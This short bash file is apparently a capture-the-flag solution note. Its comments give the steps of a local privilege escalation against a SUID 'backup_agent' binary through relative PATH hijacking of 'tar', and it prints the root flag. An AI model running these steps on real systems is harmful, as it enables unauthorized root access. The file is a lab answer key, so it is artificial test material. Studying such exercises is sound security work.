#!/bin/bash
# Privilege Escalation: Vulnerable SUID Binary '/usr/local/bin/backup_agent'
# Vector: Relative PATH hijacking on 'tar' binary call
echo 'Running backup...'
# Exploit:
# echo '/bin/sh' > /tmp/tar && chmod +x /tmp/tar
# export PATH=/tmp:
# /usr/local/bin/backup_agent
# Cat /root/flag.txt -> logicCTF{su1d_pr1v1l3g3_3sc4l4t10n_r00t}
